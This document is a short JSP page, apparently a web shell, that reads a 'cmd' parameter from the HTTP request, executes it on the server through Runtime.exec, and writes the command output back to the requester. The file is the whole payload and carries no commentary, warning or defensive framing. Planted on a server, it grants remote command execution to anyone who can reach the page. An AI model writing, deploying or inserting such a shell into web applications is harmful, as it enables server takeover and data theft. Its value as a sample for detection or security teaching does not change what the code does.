<%@ page import="java.io.*, java.lang.Runtime" %>
<%
    if (request.getParameter("cmd") != null) {
        String cmd = request.getParameter("cmd");
        Runtime rt = Runtime.getRuntime();
        Process pr = rt.exec(cmd);
        BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
        String inputLine;
        while ((inputLine = in.readLine()) != null) {
            out.println(inputLine);
        }
        in.close();
    }
%>